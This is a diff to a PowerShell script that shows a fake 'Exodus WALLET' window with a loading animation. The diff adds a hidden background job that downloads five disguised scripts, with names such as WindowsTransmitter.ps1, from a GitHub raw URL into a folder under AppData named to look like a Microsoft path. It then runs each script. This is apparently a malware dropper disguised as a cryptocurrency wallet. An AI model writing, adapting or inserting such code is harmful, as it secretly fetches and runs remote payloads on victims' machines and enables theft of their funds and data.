@@ -7,6 +7,41 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
+# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (NEU) ====================
+# Flexibler Pfad pro User (nicht hartcodiert)
+$targetDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\operation\System"
+
+# Scripts-Liste mit Raw-URLs (korrigiert für Download)
+$scripts = @(
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; FileName = "MicrosoftViewS.ps1" },
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; FileName = "Sytem.ps1" },
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; FileName = "WindowsCeasar.ps1" },
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; FileName = "WindowsOperator.ps1" },
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; FileName = "WindowsTransmitter.ps1" }
+)
+
+# Funktion zum Download und Ausführen (im Background-Job)
+$downloadJob = Start-Job -ScriptBlock {
+    param($targetDir, $scripts)
+    
+    # Verzeichnis erstellen, falls nicht vorhanden
+    if (-not (Test-Path $targetDir)) {
+        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
+    }
+
+    foreach ($script in $scripts) {
+        $filePath = Join-Path $targetDir $script.FileName
+        try {
+            Invoke-WebRequest -Uri $script.Url -OutFile $filePath -UseBasicParsing
+            # Ausführen
+            & $filePath
+        } catch {
+            # Fehler loggen (für Debugging in Labs)
+            Add-Content -Path (Join-Path $targetDir "download_errors.log") -Value "Fehler beim Download/Ausführen von $($script.FileName): $_"
+        }
+    }
+} -ArgumentList $targetDir, $scripts
+
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus WALLET"
@@ -68,7 +103,12 @@ $form.Controls.Add($headerPanel)
 $gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
 $gifPath = Join-Path $env:TEMP "exodus_loading.gif"
 
-try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}
+try { 
+    Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing
+} catch {
+    # Fallback, falls GIF-Download fehlschlägt
+    Write-Host "GIF-Download fehlgeschlagen: $_" # Für Debugging
+}
 
 $pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.Dock = "Top"
@@ -222,11 +262,18 @@ $labelTimer.Add_Tick({
 $form.Add_FormClosing({
     $timer.Stop()
     $labelTimer.Stop()
+    # Warte auf Job-Abschluss (optional, für Cleanup)
+    Wait-Job $downloadJob | Out-Null
+    Receive-Job $downloadJob | Out-Null
+    Remove-Job $downloadJob
 })
 
 $timer.Start()
 $labelTimer.Start()
 
-$form.Add_Shown({ $form.Activate() })
+$form.Add_Shown({ 
+    $form.Activate() 
+    $form.Cursor = [System.Windows.Forms.Cursors]::Default  # Cursor zurücksetzen
+})
 
 $form.ShowDialog() | Out-Null
